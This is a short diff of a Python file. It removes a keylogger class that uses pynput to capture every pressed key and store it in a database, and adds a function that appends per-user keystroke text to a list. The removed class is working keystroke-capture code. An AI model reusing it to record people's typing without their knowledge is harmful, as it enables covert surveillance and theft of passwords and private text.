@@ -1,21 +1,5 @@
-from pynput import keyboard
-import os
-from datetime import datetime
-import db
+keystroke_data = []
 
-class Keylogger:
-    def __init__(self):
-        self.running = True
-
-    def on_press(self, key):
-        try:
-            db.store_keylog(str(key.char))
-        except AttributeError:
-            pass
-
-    def start(self):
-        with keyboard.Listener(on_press=self.on_press) as listener:
-            listener.join()
-
-    def stop(self):
-        self.running = False
+def log_keystroke(user_id, key_text):
+    keystroke_data.append(f"{user_id} typed: {key_text}\n")
+    return True
